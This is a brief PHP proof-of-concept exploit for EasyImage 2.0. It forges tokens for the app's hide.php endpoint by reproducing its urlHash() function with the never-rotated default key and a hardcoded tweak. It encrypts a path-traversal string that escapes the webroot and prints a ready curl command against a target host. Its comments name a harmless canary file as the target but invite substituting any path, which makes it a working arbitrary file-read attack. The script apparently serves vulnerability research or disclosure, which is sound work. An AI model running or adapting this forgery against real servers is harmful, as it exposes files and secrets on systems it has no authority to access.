<?php
// EI2-01 - Offline token forgery replicating app/function.php urlHash().
// Harmless demonstration target: a canary file one level ABOVE the webroot
// (proves the path escape). Replace $path with any APP_ROOT-rooted path.
//
// Key derivation (factory default, never rotated by the installer):
//   key   = (string) crc32($config['hide_key'])  with hide_key = 'EasyImage2.0'
//         = "837912684" (openssl zero-pads to the 32-byte XTS key)
//   tweak = 'sciCuBC7orQtDhTO' (hardcoded, function.php)

$path = $argv[1] ?? '/../canary1.txt';
$key  = (string) crc32('EasyImage2.0');
$tweak = 'sciCuBC7orQtDhTO';
$token = base64_encode(openssl_encrypt($path, 'AES-128-XTS', $key, 0, $tweak));
echo "path : $path\n";
echo "token: $token\n";
echo "use  : curl \"http://<TARGET>/app/hide.php?key=" . rawurlencode($token) . "\"\n";
